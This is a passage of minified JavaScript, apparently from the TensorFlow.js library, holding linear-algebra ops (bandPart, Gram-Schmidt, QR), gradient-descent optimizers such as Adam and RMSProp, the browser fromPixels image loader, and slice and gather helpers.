            a = Le(Wc(t, 0), r, Gi(t, r))),
            "number" == typeof e ? (v(e % 1 == 0, (()=>`bandPart(): numUpper must be an integer, got ${e}.`)),
            v(e <= i, (()=>`bandPart(): numUpper (${e}) must not be greater than the number of columns (${i}).`)),
            c = N(e < 0 ? i : e, "numUpper", "bandPart")) : (v("int32" === e.dtype, (()=>"bandPart(): numUpper's dtype must be an int32.")),
            c = Le(Wc(e, 0), i, Gi(e, i)));
            const l = W(Ei(0, r, 1, "int32"), [-1, 1])
              , u = Ei(0, i, 1, "int32")
              , d = pt(l, u)
              , h = rs(Qo(d, a), oo(d, ne(c)))
              , p = ge([r, i], s.dtype);
            return W(On(lo(W(s, [-1, r, i])).map((f=>Le(h, f, p)))), o)
        }
    });
    const pT = D({
        gramSchmidt_: function hT(n) {
            let t;
            if (Array.isArray(n)) {
                t = !1,
                v(null != n && n.length > 0, (()=>"Gram-Schmidt process: input must not be null, undefined, or empty"));
                const o = n[0].shape[0];
                for (let r = 1; r < n.length; ++r)
                    v(n[r].shape[0] === o, (()=>`Gram-Schmidt: Non-unique lengths found in the input vectors: (${n[r].shape[0]} vs. ${o})`))
            } else
                t = !0,
                n = on(n, n.shape[0], 0).map((o=>Di(o, [0])));
            v(n.length <= n[0].shape[0], (()=>`Gram-Schmidt: Number of vectors (${n.length}) exceeds number of dimensions (${n[0].shape[0]}).`));
            const e = []
              , s = n;
            for (let o = 0; o < n.length; ++o)
                e.push(G.tidy((()=>{
                    let r = s[o];
                    if (o > 0)
                        for (let i = 0; i < o; ++i) {
                            const a = E(ut(E(e[i], r)), e[i]);
                            r = pt(r, a)
                        }
                    return dt(r, Ec(r, "euclidean"))
                }
                )));
            return t ? On(e, 0) : e
        }
    });
    function ug(n, t=!1) {
        return G.tidy((()=>{
            v(2 === n.shape.length, (()=>`qr2d() requires a 2D Tensor, but got a ${n.shape.length}D Tensor.`));
            const e = n.shape[0]
              , s = n.shape[1];
            let o = Xm(e)
              , r = to(n);
            const i = Ad([[1]], [1, 1]);
            let a = to(i);
            const c = e >= s ? s : e;
            for (let l = 0; l < c; ++l) {
                const u = r
                  , d = a
                  , h = o;
                [a,r,o] = G.tidy((()=>{
                    const p = Xt(r, [l, l], [e - l, 1])
                      , f = Ec(p)
                      , m = Xt(r, [l, l], [1, 1])
                      , g = Le(sn(m, 0), Ad([[-1]]), Ad([[1]]))
                      , b = pt(m, E(g, f))
                      , x = dt(p, b);
                    a = 1 === x.shape[0] ? to(i) : Xe([i, Xt(x, [1, 0], [x.shape[0] - 1, x.shape[1]])], 0);
                    const I = ne(dt($t(g, b), f))
                      , y = Xt(r, [l, 0], [e - l, s])
                      , w = E(I, a)
                      , C = kt(a);
                    if (0 === l)
                        r = pt(y, $t(w, $t(C, y)));
                    else {
                        const T = pt(y, $t(w, $t(C, y)));
                        r = Xe([Xt(r, [0, 0], [l, s]), T], 0)
                    }
                    const k = kt(w)
                      , S = Xt(o, [0, l], [e, o.shape[1] - l]);
                    if (0 === l)
                        o = pt(S, $t($t(S, a), k));
                    else {
                        const T = pt(S, $t($t(S, a), k));
                        o = Xe([Xt(o, [0, 0], [e, l]), T], 1)
                    }
                    return [a, r, o]
                }
                )),
                vt([u, d, h])
            }
            return !t && e > s && (o = Xt(o, [0, 0], [e, s]),
            r = Xt(r, [0, 0], [s, s])),
            [o, r]
        }
        ))
    }
    const mT = D({
        qr_: function fT(n, t=!1) {
            if (v(n.rank >= 2, (()=>`qr() requires input tensor to have a rank >= 2, but got rank ${n.rank}`)),
            2 === n.rank)
                return ug(n, t);
            {
                const e = n.shape.slice(0, n.shape.length - 2).reduce(((c,l)=>c * l))
                  , s = lo(W(n, [e, n.shape[n.shape.length - 2], n.shape[n.shape.length - 1]]), 0)
                  , o = []
                  , r = [];
                s.forEach((c=>{
                    const [l,u] = ug(c, t);
                    o.push(l),
                    r.push(u)
                }
                ));
                return [W(On(o, 0), n.shape), W(On(r, 0), n.shape)]
            }
        }
    })
      , is = {
        flipLeftRight: Ek,
        grayscaleToRGB: Wk,
        resizeNearestNeighbor: lg,
        resizeBilinear: cg,
        rgbToGrayscale: Vk,
        rotateWithOffset: zk,
        cropAndResize: Gk,
        nonMaxSuppression: Ak,
        nonMaxSuppressionAsync: Uk,
        nonMaxSuppressionWithScore: Qk,
        nonMaxSuppressionWithScoreAsync: jk,
        nonMaxSuppressionPadded: tT,
        nonMaxSuppressionPaddedAsync: nT,
        threshold: aT,
        transform: lT
    }
      , gT = {
        bandPart: dT,
        gramSchmidt: pT,
        qr: mT
    }
      , bT = new Map
      , xT = new Map;
    class qo {
        getClassName() {
            return this.constructor.className
        }
        static fromConfig(t, e) {
            return new t(e)
        }
    }
    class mn {
        constructor() {
            this.classNameMap = {}
        }
        static getMap() {
            return null == mn.instance && (mn.instance = new mn),
            mn.instance
        }
        static register(t) {
            mn.getMap().classNameMap[t.className] = [t, t.fromConfig]
        }
    }
    function _(n, t, e) {
        v(null != n.className, (()=>"Class being registered does not have the static className property defined.")),
        v("string" == typeof n.className, (()=>"className is required to be a string, but got type " + typeof n.className)),
        v(n.className.length > 0, (()=>"Class being registered has an empty-string as its className, which is disallowed.")),
        typeof t > "u" && (t = "Custom"),
        typeof e > "u" && (e = n.className);
        const o = t + ">" + e;
        return mn.register(n),
        bT.set(o, n),
        xT.set(n, o),
        n
    }
    class ks extends qo {
        minimize(t, e=!1, s) {
            const {value: o, grads: r} = this.computeGradients(t, s);
            if (null != s) {
                const i = s.map((a=>({
                    name: a.name,
                    tensor: r[a.name]
                })));
                this.applyGradients(i)
            } else
                this.applyGradients(r);
            return vt(r),
            e ? o : (o.dispose(),
            null)
        }
        get iterations() {
            return null == this.iterations_ && (this.iterations_ = 0),
            this.iterations_
        }
        incrementIterations() {
            this.iterations_ = this.iterations + 1
        }
        computeGradients(t, e) {
            return function Tv(n, t) {
                v(Ql(n), (()=>"The f passed in variableGrads(f) must be a function")),
                v(null == t || Array.isArray(t) && t.every((l=>l instanceof Tc)), (()=>"The varList passed in variableGrads(f, varList) must be an array of variables"));
                const e = null != t;
                if (!e) {
                    t = [];
                    for (const l in G.registeredVariables)
                        t.push(G.registeredVariables[l])
                }
                const s = e ? t.filter((l=>!l.trainable)) : null
                  , o = t.length;
                v((t = t.filter((l=>l.trainable))).length > 0, (()=>`variableGrads() expects at least one of the input variables to be trainable, but none of the ${o} variables is trainable.`));
                const {value: i, grads: a} = G.gradients(n, t, null, !0);
                v(a.some((l=>null != l)), (()=>"Cannot find a connection between any variable and the result of the loss function y=f(x). Please make sure the operations that use variables are inside the function f passed to minimize().")),
                v(0 === i.rank, (()=>`The f passed in variableGrads(f) must return a scalar, but it returned a rank-${i.rank} tensor`));
                const c = {};
                return t.forEach(((l,u)=>{
                    null != a[u] && (c[l.name] = a[u])
                }
                )),
                null != s && s.forEach((l=>c[l.name] = null)),
                {
                    value: i,
                    grads: c
                }
            }(t, e)
        }
        dispose() {
            null != this.iterations_ && vt(this.iterations_)
        }
        async saveIterations() {
            return null == this.iterations_ && (this.iterations_ = 0),
            {
                name: "iter",
                tensor: Gt(this.iterations_, "int32")
            }
        }
        async getWeights() {
            throw new Error("getWeights() is not implemented for this optimizer yet.")
        }
        async setWeights(t) {
            throw new Error(`setWeights() is not implemented for this optimizer class ${this.getClassName()}`)
        }
        async extractIterations(t) {
            return this.iterations_ = (await t[0].tensor.data())[0],
            t.slice(1)
        }
    }
    Object.defineProperty(ks, Symbol.hasInstance, {
        value: n=>null != n.minimize && null != n.computeGradients && null != n.applyGradients
    });
    class dg extends ks {
        static get className() {
            return "Adadelta"
        }
        constructor(t, e, s=null) {
            super(),
            this.learningRate = t,
            this.rho = e,
            this.epsilon = s,
            this.accumulatedGrads = [],
            this.accumulatedUpdates = [],
            null == s && (this.epsilon = G.backend.epsilon())
        }
        applyGradients(t) {
            (Array.isArray(t) ? t.map((s=>s.name)) : Object.keys(t)).forEach(((s,o)=>{
                const r = G.registeredVariables[s]
                  , i = !1;
                null == this.accumulatedGrads[o] && (this.accumulatedGrads[o] = {
                    originalName: `${s}/accum_grad`,
                    variable: M((()=>St(r).variable(i)))
                }),
                null == this.accumulatedUpdates[o] && (this.accumulatedUpdates[o] = {
                    originalName: `${s}/accum_var`,
                    variable: M((()=>St(r).variable(i)))
                });
                const a = Array.isArray(t) ? t[o].tensor : t[s];
                if (null == a)
                    return;
                const c = this.accumulatedGrads[o].variable
                  , l = this.accumulatedUpdates[o].variable;
                M((()=>{
                    const u = Q(E(c, this.rho), E(Bt(a), 1 - this.rho))
                      , d = E(dt(Ee(Q(l, this.epsilon)), Ee(Q(c, this.epsilon))), a)
                      , h = Q(E(l, this.rho), E(Bt(d), 1 - this.rho));
                    c.assign(u),
                    l.assign(h);
                    const p = Q(E(d, -this.learningRate), r);
                    r.assign(p)
                }
                ))
            }
            )),
            this.incrementIterations()
        }
        dispose() {
            null != this.accumulatedUpdates && (vt(this.accumulatedGrads.map((t=>t.variable))),
            vt(this.accumulatedUpdates.map((t=>t.variable))))
        }
        async getWeights() {
            const t = [...this.accumulatedGrads, ...this.accumulatedUpdates];
            return [await this.saveIterations()].concat(t.map((e=>({
                name: e.originalName,
                tensor: e.variable
            }))))
        }
        async setWeights(t) {
            const e = (t = await this.extractIterations(t)).length / 2
              , s = !1;
            this.accumulatedGrads = t.slice(0, e).map((o=>({
                originalName: o.name,
                variable: o.tensor.variable(s)
            }))),
            this.accumulatedUpdates = t.slice(e, 2 * e).map((o=>({
                originalName: o.name,
                variable: o.tensor.variable(s)
            })))
        }
        getConfig() {
            return {
                learningRate: this.learningRate,
                rho: this.rho,
                epsilon: this.epsilon
            }
        }
        static fromConfig(t, e) {
            return new t(e.learningRate,e.rho,e.epsilon)
        }
    }
    class hg extends ks {
        static get className() {
            return "Adagrad"
        }
        constructor(t, e=.1) {
            super(),
            this.learningRate = t,
            this.initialAccumulatorValue = e,
            this.accumulatedGrads = []
        }
        applyGradients(t) {
            (Array.isArray(t) ? t.map((s=>s.name)) : Object.keys(t)).forEach(((s,o)=>{
                const r = G.registeredVariables[s];
                null == this.accumulatedGrads[o] && (this.accumulatedGrads[o] = {
                    originalName: `${s}/accumulator`,
                    variable: M((()=>$c(r.shape, this.initialAccumulatorValue).variable(!1)))
                });
                const i = Array.isArray(t) ? t[o].tensor : t[s];
                if (null == i)
                    return;
                const a = this.accumulatedGrads[o].variable;
                M((()=>{
                    const c = Q(a, Bt(i));
                    a.assign(c);
                    const l = Q(E(dt(i, Ee(Q(c, G.backend.epsilon()))), -this.learningRate), r);
                    r.assign(l)
                }
                ))
            }
            )),
            this.incrementIterations()
        }
        dispose() {
            null != this.accumulatedGrads && vt(this.accumulatedGrads.map((t=>t.variable)))
        }
        async getWeights() {
            return [await this.saveIterations()].concat(this.accumulatedGrads.map((t=>({
                name: t.originalName,
                tensor: t.variable
            }))))
        }
        async setWeights(t) {
            t = await this.extractIterations(t);
            this.accumulatedGrads = t.map((s=>({
                originalName: s.name,
                variable: s.tensor.variable(false)
            })))
        }
        getConfig() {
            return {
                learningRate: this.learningRate,
                initialAccumulatorValue: this.initialAccumulatorValue
            }
        }
        static fromConfig(t, e) {
            return new t(e.learningRate,e.initialAccumulatorValue)
        }
    }
    class pg extends ks {
        static get className() {
            return "Adam"
        }
        constructor(t, e, s, o=null) {
            super(),
            this.learningRate = t,
            this.beta1 = e,
            this.beta2 = s,
            this.epsilon = o,
            this.accumulatedFirstMoment = [],
            this.accumulatedSecondMoment = [],
            M((()=>{
                this.accBeta1 = Gt(e).variable(),
                this.accBeta2 = Gt(s).variable()
            }
            )),
            null == o && (this.epsilon = G.backend.epsilon())
        }
        applyGradients(t) {
            const e = Array.isArray(t) ? t.map((s=>s.name)) : Object.keys(t);
            M((()=>{
                const s = pt(1, this.accBeta1)
                  , o = pt(1, this.accBeta2);
                e.forEach(((r,i)=>{
                    const a = G.registeredVariables[r]
                      , c = !1;
                    null == this.accumulatedFirstMoment[i] && (this.accumulatedFirstMoment[i] = {
                        originalName: `${r}/m`,
                        variable: M((()=>St(a).variable(c)))
                    }),
                    null == this.accumulatedSecondMoment[i] && (this.accumulatedSecondMoment[i] = {
                        originalName: `${r}/v`,
                        variable: M((()=>St(a).variable(c)))
                    });
                    const l = Array.isArray(t) ? t[i].tensor : t[r];
                    if (null == l)
                        return;
                    const u = this.accumulatedFirstMoment[i].variable
                      , d = this.accumulatedSecondMoment[i].variable
                      , h = Q(E(u, this.beta1), E(l, 1 - this.beta1))
                      , p = Q(E(d, this.beta2), E(Bt(l), 1 - this.beta2))
                      , f = dt(h, s)
                      , m = dt(p, o);
                    u.assign(h),
                    d.assign(p);
                    const g = Q(E(dt(f, Q(Ee(m), this.epsilon)), -this.learningRate), a);
                    a.assign(g)
                }
                )),
                this.accBeta1.assign(E(this.accBeta1, this.beta1)),
                this.accBeta2.assign(E(this.accBeta2, this.beta2))
            }
            )),
            this.incrementIterations()
        }
        dispose() {
            this.accBeta1.dispose(),
            this.accBeta2.dispose(),
            null != this.accumulatedFirstMoment && vt(this.accumulatedFirstMoment.map((t=>t.variable))),
            null != this.accumulatedSecondMoment && vt(this.accumulatedSecondMoment.map((t=>t.variable)))
        }
        async getWeights() {
            const t = [...this.accumulatedFirstMoment, ...this.accumulatedSecondMoment];
            return [await this.saveIterations()].concat(t.map((e=>({
                name: e.originalName,
                tensor: e.variable
            }))))
        }
        async setWeights(t) {
            t = await this.extractIterations(t),
            M((()=>{
                this.accBeta1.assign(Yo(this.beta1, this.iterations_ + 1)),
                this.accBeta2.assign(Yo(this.beta2, this.iterations_ + 1))
            }
            ));
            const e = t.length / 2
              , s = !1;
            this.accumulatedFirstMoment = t.slice(0, e).map((o=>({
                originalName: o.name,
                variable: o.tensor.variable(s)
            }))),
            this.accumulatedSecondMoment = t.slice(e, 2 * e).map((o=>({
                originalName: o.name,
                variable: o.tensor.variable(s)
            })))
        }
        getConfig() {
            return {
                learningRate: this.learningRate,
                beta1: this.beta1,
                beta2: this.beta2,
                epsilon: this.epsilon
            }
        }
        static fromConfig(t, e) {
            return new t(e.learningRate,e.beta1,e.beta2,e.epsilon)
        }
    }
    class fg extends ks {
        static get className() {
            return "Adamax"
        }
        constructor(t, e, s, o=null, r=0) {
            super(),
            this.learningRate = t,
            this.beta1 = e,
            this.beta2 = s,
            this.epsilon = o,
            this.decay = r,
            this.accumulatedFirstMoment = [],
            this.accumulatedWeightedInfNorm = [],
            M((()=>{
                this.iteration = Gt(0).variable(),
                this.accBeta1 = Gt(e).variable()
            }
            )),
            null == o && (this.epsilon = G.backend.epsilon())
        }
        applyGradients(t) {
            const e = Array.isArray(t) ? t.map((s=>s.name)) : Object.keys(t);
            M((()=>{
                const s = pt(1, this.accBeta1)
                  , o = dt(-this.learningRate, Q(E(this.iteration, this.decay), 1));
                e.forEach(((r,i)=>{
                    const a = G.registeredVariables[r]
                      , c = !1;
                    null == this.accumulatedFirstMoment[i] && (this.accumulatedFirstMoment[i] = {
                        originalName: `${r}/m`,
                        variable: St(a).variable(c)
                    }),
                    null == this.accumulatedWeightedInfNorm[i] && (this.accumulatedWeightedInfNorm[i] = {
                        originalName: `${r}/v`,
                        variable: St(a).variable(c)
                    });
                    const l = Array.isArray(t) ? t[i].tensor : t[r];
                    if (null == l)
                        return;
                    const u = this.accumulatedFirstMoment[i].variable
                      , d = this.accumulatedWeightedInfNorm[i].variable
                      , h = Q(E(u, this.beta1), E(l, 1 - this.beta1))
                      , p = E(d, this.beta2)
                      , f = Ge(l)
                      , m = vs(p, f);
                    u.assign(h),
                    d.assign(m);
                    const g = Q(E(dt(o, s), dt(h, Q(m, this.epsilon))), a);
                    a.assign(g)
                }
                )),
                this.iteration.assign(Q(this.iteration, 1)),
                this.accBeta1.assign(E(this.accBeta1, this.beta1))
            }
            )),
            this.incrementIterations()
        }
        dispose() {
            this.accBeta1.dispose(),
            this.iteration.dispose(),
            null != this.accumulatedFirstMoment && vt(this.accumulatedFirstMoment.map((t=>t.variable))),
            null != this.accumulatedWeightedInfNorm && vt(this.accumulatedWeightedInfNorm.map((t=>t.variable)))
        }
        async getWeights() {
            throw new Error("getWeights() is not implemented for Adamax yet.")
        }
        async setWeights(t) {
            throw new Error("setWeights() is not implemented for Adamax yet.")
        }
        getConfig() {
            return {
                learningRate: this.learningRate,
                beta1: this.beta1,
                beta2: this.beta2,
                epsilon: this.epsilon,
                decay: this.decay
            }
        }
        static fromConfig(t, e) {
            return new t(e.learningRate,e.beta1,e.beta2,e.epsilon,e.decay)
        }
    }
    class Qd extends ks {
        static get className() {
            return "SGD"
        }
        constructor(t) {
            super(),
            this.learningRate = t,
            this.setLearningRate(t)
        }
        applyGradients(t) {
            (Array.isArray(t) ? t.map((s=>s.name)) : Object.keys(t)).forEach(((s,o)=>{
                const r = Array.isArray(t) ? t[o].tensor : t[s];
                if (null == r)
                    return;
                const i = G.registeredVariables[s];
                M((()=>{
                    const a = Q(E(this.c, r), i);
                    i.assign(a)
                }
                ))
            }
            )),
            this.incrementIterations()
        }
        setLearningRate(t) {
            this.learningRate = t,
            null != this.c && this.c.dispose(),
            this.c = en(Gt(-t))
        }
        dispose() {
            this.c.dispose()
        }
        async getWeights() {
            return [await this.saveIterations()]
        }
        async setWeights(t) {
            if (0 !== (t = await this.extractIterations(t)).length)
                throw new Error("SGD optimizer does not have settable weights.")
        }
        getConfig() {
            return {
                learningRate: this.learningRate
            }
        }
        static fromConfig(t, e) {
            return new t(e.learningRate)
        }
    }
    class mg extends Qd {
        static get className() {
            return "Momentum"
        }
        constructor(t, e, s=!1) {
            super(t),
            this.learningRate = t,
            this.momentum = e,
            this.useNesterov = s,
            this.accumulations = [],
            this.m = Gt(this.momentum)
        }
        applyGradients(t) {
            (Array.isArray(t) ? t.map((s=>s.name)) : Object.keys(t)).forEach(((s,o)=>{
                const r = G.registeredVariables[s];
                null == this.accumulations[o] && (this.accumulations[o] = {
                    originalName: `${s}/momentum`,
                    variable: M((()=>St(r).variable(!1)))
                });
                const i = this.accumulations[o].variable
                  , a = Array.isArray(t) ? t[o].tensor : t[s];
                null != a && M((()=>{
                    let c;
                    const l = Q(E(this.m, i), a);
                    c = this.useNesterov ? Q(E(this.c, Q(a, E(l, this.m))), r) : Q(E(this.c, l), r),
                    i.assign(l),
                    r.assign(c)
                }
                ))
            }
            )),
            this.incrementIterations()
        }
        dispose() {
            this.m.dispose(),
            null != this.accumulations && vt(this.accumulations.map((t=>t.variable)))
        }
        setMomentum(t) {
            this.momentum = t
        }
        async getWeights() {
            return [await this.saveIterations()].concat(this.accumulations.map((t=>({
                name: t.originalName,
                tensor: t.variable
            }))))
        }
        async setWeights(t) {
            t = await this.extractIterations(t);
            this.accumulations = t.map((s=>({
                originalName: s.name,
                variable: s.tensor.variable(false)
            })))
        }
        getConfig() {
            return {
                learningRate: this.learningRate,
                momentum: this.momentum,
                useNesterov: this.useNesterov
            }
        }
        static fromConfig(t, e) {
            return new t(e.learningRate,e.momentum,e.useNesterov)
        }
    }
    class gg extends ks {
        static get className() {
            return "RMSProp"
        }
        constructor(t, e=.9, s=0, o=null, r=!1) {
            if (super(),
            this.learningRate = t,
            this.decay = e,
            this.momentum = s,
            this.epsilon = o,
            this.accumulatedMeanSquares = [],
            this.accumulatedMoments = [],
            this.accumulatedMeanGrads = [],
            this.centered = r,
            null == o && (this.epsilon = G.backend.epsilon()),
            null == t)
                throw new Error("learningRate for RMSPropOptimizer must be defined.")
        }
        applyGradients(t) {
            (Array.isArray(t) ? t.map((s=>s.name)) : Object.keys(t)).forEach(((s,o)=>{
                const r = G.registeredVariables[s]
                  , i = !1;
                null == this.accumulatedMeanSquares[o] && (this.accumulatedMeanSquares[o] = {
                    originalName: `${s}/rms`,
                    variable: M((()=>St(r).variable(i)))
                }),
                null == this.accumulatedMoments[o] && (this.accumulatedMoments[o] = {
                    originalName: `${s}/momentum`,
                    variable: M((()=>St(r).variable(i)))
                }),
                null == this.accumulatedMeanGrads[o] && this.centered && (this.accumulatedMeanGrads[o] = {
                    originalName: `${s}/mg`,
                    variable: M((()=>St(r).variable(i)))
                });
                const a = Array.isArray(t) ? t[o].tensor : t[s];
                if (null == a)
                    return;
                const c = this.accumulatedMeanSquares[o].variable
                  , l = this.accumulatedMoments[o].variable;
                M((()=>{
                    const u = Q(E(c, this.decay), E(Bt(a), 1 - this.decay));
                    if (this.centered) {
                        const d = this.accumulatedMeanGrads[o].variable
                          , h = Q(E(d, this.decay), E(a, 1 - this.decay))
                          , p = dt(E(a, this.learningRate), Ee(pt(u, Q(Bt(h), this.epsilon))))
                          , f = Q(E(l, this.momentum), p);
                        c.assign(u),
                        d.assign(h),
                        l.assign(f);
                        const m = pt(r, f);
                        r.assign(m)
                    } else {
                        const d = Q(E(c, this.decay), E(Bt(a), 1 - this.decay))
                          , h = Q(E(l, this.momentum), dt(E(a, this.learningRate), Ee(Q(d, this.epsilon))));
                        c.assign(d),
                        l.assign(h);
                        const p = pt(r, h);
                        r.assign(p)
                    }
                }
                ))
            }
            )),
            this.incrementIterations()
        }
        dispose() {
            null != this.accumulatedMeanSquares && vt(this.accumulatedMeanSquares.map((t=>t.variable))),
            null != this.accumulatedMeanGrads && this.centered && vt(this.accumulatedMeanGrads.map((t=>t.variable))),
            null != this.accumulatedMoments && vt(this.accumulatedMoments.map((t=>t.variable)))
        }
        async getWeights() {
            const t = [...this.accumulatedMeanSquares, ...this.accumulatedMoments];
            return this.centered && t.push(...this.accumulatedMeanGrads),
            [await this.saveIterations()].concat(t.map((e=>({
                name: e.originalName,
                tensor: e.variable
            }))))
        }
        async setWeights(t) {
            t = await this.extractIterations(t);
            const e = this.centered ? t.length / 3 : t.length / 2
              , s = !1;
            this.accumulatedMeanSquares = t.slice(0, e).map((o=>({
                originalName: o.name,
                variable: o.tensor.variable(s)
            }))),
            this.accumulatedMoments = t.slice(e, 2 * e).map((o=>({
                originalName: o.name,
                variable: o.tensor.variable(s)
            }))),
            this.centered && (this.accumulatedMeanGrads = t.slice(2 * e, 3 * e).map((o=>({
                originalName: o.name,
                variable: o.tensor.variable(s)
            }))))
        }
        getConfig() {
            return {
                learningRate: this.learningRate,
                decay: this.decay,
                momentum: this.momentum,
                epsilon: this.epsilon,
                centered: this.centered
            }
        }
        static fromConfig(t, e) {
            return new t(e.learningRate,e.decay,e.momentum,e.epsilon,e.centered)
        }
    }
    const yT = [dg, hg, pg, fg, mg, gg, Qd];
    let uo;
    const CT = D({
        fromPixels_: function wT(n, t=3) {
            if (t > 4)
                throw new Error("Cannot construct Tensor with more than 4 channels from pixels.");
            if (null == n)
                throw new Error("pixels passed to tf.browser.fromPixels() can not be null");
            let e = !1
              , s = !1
              , o = !1
              , r = !1
              , i = !1
              , a = !1;
            if (n.data instanceof Uint8Array)
                e = !0;
            else if (typeof ImageData < "u" && n instanceof ImageData)
                s = !0;
            else if (typeof HTMLVideoElement < "u" && n instanceof HTMLVideoElement)
                o = !0;
            else if (typeof HTMLImageElement < "u" && n instanceof HTMLImageElement)
                r = !0;
            else if (null != n.getContext)
                i = !0;
            else {
                if (!(typeof ImageBitmap < "u" && n instanceof ImageBitmap))
                    throw new Error(`pixels passed to tf.browser.fromPixels() must be either an HTMLVideoElement, HTMLImageElement, HTMLCanvasElement, ImageData in browser, or OffscreenCanvas, ImageData in webworker or {data: Uint32Array, width: number, height: number}, but was ${n.constructor.name}`);
                a = !0
            }
            if (null != _u(Zu, G.backendName)) {
                const f = {
                    pixels: n
                }
                  , m = {
                    numChannels: t
                };
                return G.runKernel(Zu, f, m)
            }
            const [l,u] = o ? [n.videoWidth, n.videoHeight] : [n.width, n.height];
            let d, h;
            if (i)
                d = n.getContext("2d").getImageData(0, 0, l, u).data;
            else if (s || e)
                d = n.data;
            else if (r || o || a) {
                if (null == uo)
                    if (typeof document > "u") {
                        if (!(typeof OffscreenCanvas < "u" && typeof OffscreenCanvasRenderingContext2D < "u"))
                            throw new Error("Cannot parse input in current context. Reason: OffscreenCanvas Context2D rendering is not supported.");
                        uo = new OffscreenCanvas(1,1).getContext("2d")
                    } else
                        uo = document.createElement("canvas").getContext("2d", {
                            willReadFrequently: !0
                        });
                uo.canvas.width = l,
                uo.canvas.height = u,
                uo.drawImage(n, 0, 0, l, u),
                d = uo.getImageData(0, 0, l, u).data
            }
            if (4 === t)
                h = new Int32Array(d);
            else {
                const f = l * u;
                h = new Int32Array(f * t);
                for (let m = 0; m < f; m++)
                    for (let g = 0; g < t; ++g)
                        h[m * t + g] = d[4 * m + g]
            }
            return function ak(n, t, e) {
                if (_l(n),
                null != t && 3 !== t.length)
                    throw new Error("tensor3d() requires shape to have three numbers");
                const s = wi(n, e);
                if (3 !== s.length && 1 !== s.length)
                    throw new Error("tensor3d() requires values to be number[][][] or flat/TypedArray");
                if (1 === s.length && null == t)
                    throw new Error("tensor3d() requires shape to be provided when `values` are a flat array");
                return Ci(n, t, s, e)
            }(h, [u, l, t], "int32")
        }
    });
    function Jd(n, t) {
        const e = n.shape.length
          , s = t.shape.length;
        if (e < 1)
            throw new Error(`tf.gatherND() expects the input to be rank 1 or higher, but the rank was ${e}.`);
        if (s < 1)
            throw new Error(`tf.gatherND() expects the indices to be rank 1 or higher, but the rank was ${s}.`);
        if ("int32" !== t.dtype)
            throw new Error(`tf.gatherND() expects the indices to be int32 type, but the dtype was ${t.dtype}.`);
        if (t.shape[s - 1] > e)
            throw new Error(`index innermost dimension length must be <= tensor rank; saw: ${t.shape[s - 1]} vs. ${e}`);
        if (0 === Z(n.shape))
            throw new Error(`Requested more than 0 entries, but input is empty. Input shape: ${n.shape}.`);
        const o = t.shape
          , r = o[o.length - 1];
        let i = 1;
        for (let d = 0; d < o.length - 1; ++d)
            i *= o[d];
        const a = n.shape
          , c = o.slice();
        c.pop();
        let l = 1;
        for (let d = r; d < e; ++d)
            l *= a[d],
            c.push(a[d]);
        const u = [...ct(n.shape).map((d=>d / l)), 1].slice(0, r);
        return [c, i, l, u]
    }
    const jd = -2
      , vT = -1;
    function qd(n, t, e) {
        const s = n.shape.length;
        v(s === t.length, (()=>`Error in slice${s}D: Length of begin ${t} must match the rank of the array (${s}).`)),
        v(s === e.length, (()=>`Error in slice${s}D: Length of size ${e} must match the rank of the array (${s}).`));
        for (let o = 0; o < s; ++o)
            v(t[o] + e[o] <= n.shape[o], (()=>`Error in slice${s}D: begin[${o}] + size[${o}] (${t[o] + e[o]}) would overflow input.shape[${o}] (${n.shape[o]})`))
    }
    function th(n, t, e) {
        const s = [];
        for (let o = 0; o < n.length; o++)
            s[o] = Math.ceil((t[o] - n[o]) / e[o]);
        return s
    }
    function bg(n, t, e, s) {
        const o = [...n];
        for (let r = o.length; r < s.length; r++)
            o.push(1);
        for (let r = 0; r < e; r++)
            0 === r ? o[t] = 1 : (o.splice(t, 0, 1),
            o.pop());
        return o
    }
    function xg(n, t, e) {
        return e <= n ? e : e - (t - 1)
    }
    function yg(n, t) {
        const e = [];
        for (let s = 0; s < n; s++)
            e.push(t + s);
        return e
    }
    function Ig(n, t, e, s, o) {
        const r = [...o]
          , i = yg(e, t);
        for (let a = 0; a < r.length; a++)
            if (i.indexOf(a) > -1)
                r[a] = 0;
            else {
                const c = xg(t, e, a);
                let l = s[c];
                n & 1 << c && (l = 0),
                r[a] = l
            }
        return r
    }
    function wg(n, t, e, s, o) {
        const r = [...o]
          , i = yg(e, t);
        for (let a = 0; a < r.length; a++)
            if (i.indexOf(a) > -1)
                r[a] = Number.MAX_SAFE_INTEGER;
            else {
                const c = xg(t, e, a);
                let l = s[c];
                n & 1 << c && (l = Number.MAX_SAFE_INTEGER),
                r[a] = l
            }
        for (let a = 0; a < r.length; a++) {
            const c = o[a];
            r[a] < 0 && (r[a] += c),
            r[a] = Ks(0, r[a], o[a])
        }
        return r
    }
    function Cg(n, t, e) {
        let s = n[t];
        return (e & 1 << t || null == s) && (s = 1),
        s
    }
    function vg(n, t, e, s, o, r) {
        let i = t[o];
        const a = e[o] || 1;
        (n & 1 << o || r & 1 << o || null == i) && (i = a > 0 ? Number.MIN_SAFE_INTEGER : Number.MAX_SAFE_INTEGER);
        const c = s[o];
        return i < 0 && (i += c),
        i = Ks(0, i, c - 1),
        i
    }
    function Sg(n, t, e, s, o, r) {
        let i = t[o];
        const a = e[o] || 1;
        (n & 1 << o || r & 1 << o || null == i) && (i = a > 0 ? Number.MAX_SAFE_INTEGER : Number.MIN_SAFE_INTEGER);
        const c = s[o];
        return i < 0 && (i += c),
        i = a > 0 ? Ks(0, i, c) : Ks(-1, i, c - 1),
        i
    }
    function eh(n, t, e) {
        let s = e.length;
        for (let o = 0; o < e.length; o++)
            if (e[o] > 1) {
                s = o;
                break
            }
        for (let o = s + 1; o < e.length; o++)
            if (t[o] > 0 || e[o] !== n[o])
                return !1;
        return !0
    }
    function nh(n, t) {
        let e = n.length > 0 ? n[n.length - 1] : 1;
        for (let s = 0; s < n.length - 1; s++)
            e += n[s] * t[s];
        return e
    }
    function zc(n, t, e) {
        let s;
        const o = n.shape.length;
        let r;
        return s = "number" == typeof t ? [t, ...new Array(o - 1).fill(0)] : t.length < o ? t.concat(new Array(o - t.length).fill(0)) : t.slice(),
        s.forEach((i=>{
            v(-1 !== i, (()=>"slice() does not support negative begin indexing."))
        }
        )),
        r = null == e ? new Array(o).fill(-1) : "number" == typeof e ? [e, ...new Array(o - 1).fill(-1)] : e.length < o ? e.concat(new Array(o - e.length).fill(-1)) : e,
        r = r.map(((i,a)=>i >= 0 ? i : (v(-1 === i, (()=>`Negative size values should be exactly -1 but got ${i} for the slice() size at index ${a}.`)),
        n.shape[a] - s[a]))),
        [s, r]
    }
    function sh(n, t, e, s, o, r, i, a, c) {
        let l;
